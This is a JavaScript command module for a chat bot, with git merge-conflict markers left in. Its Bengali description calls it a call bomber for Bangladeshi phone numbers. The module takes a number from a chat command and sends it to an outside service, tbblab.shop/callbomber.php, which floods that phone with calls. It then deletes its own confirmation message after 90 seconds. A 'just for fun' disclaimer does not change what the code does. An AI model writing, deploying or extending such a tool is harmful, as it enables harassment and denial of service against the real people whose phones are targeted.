<<<<<<< HEAD
module.exports.config = {
=======
/cmd install call.js module.exports.config = {
>>>>>>> 4843034469b2907b0d45b8d6e4c05e01e0125545
 name: "call",
 version: "1.0.0",
 role: 2,
 author: "Yeasin", //don't change my credit 
 description: "কল বোম্বার, শুধুমাত্র বাংলাদেশি নাম্বারের জন্য",
 category: "Tool",
 usages: "/call 01xxxxxxxxx",
 cooldowns: 15,
 guide: { "axios": "" }
};
 
module.exports.onStart = async ({ api, event, args }) => {
 const axios = require('axios');
 const number = args[0];
 
 if (!number || !/^01[0-9]{9}$/.test(number)) {
 return api.sendMessage("অনুগ্রহ করে সঠিক বাংলাদেশি নাম্বার দিন (উদাহরণ: /call 01xxxxxxxxx) দয়া করে কেউ খারাপ কাজে ব্যবহার করবেন না 🙂,\n ফাইলটি শুধুমাত্র মজা করার উদ্দেশ্যে তৈরি করা হয়েছে।", event.threadID, event.messageID);
 }
 
 api.sendMessage(`✅ 𝙔𝙚𝙖𝙨𝙞𝙣 𝗯𝗼𝘁 থেকে কল দেয়া হয়েছে: ${number} নম্বরে...📞💣\n`, event.threadID, async (err, info) => {
 try {
 const response = await axios.get(`https://tbblab.shop/callbomber.php?mobile=${number}`);
 setTimeout(() => {
 api.unsendMessage(info.messageID);
 }, 90000);
 
 return api.sendMessage(`✅ 𝙔𝙚𝙖𝙨𝙞𝙣 𝗯𝗼𝘁 থেকে কল চইলা গেসে  ${number} নম্বরে।`, event.threadID, event.messageID);
 } catch (error) {
 return api.sendMessage(`❌ ত্রুটি: ${error.message}`, event.threadID, event.messageID);
 }
 });
<<<<<<< HEAD
};
=======
};
>>>>>>> 4843034469b2907b0d45b8d6e4c05e01e0125545
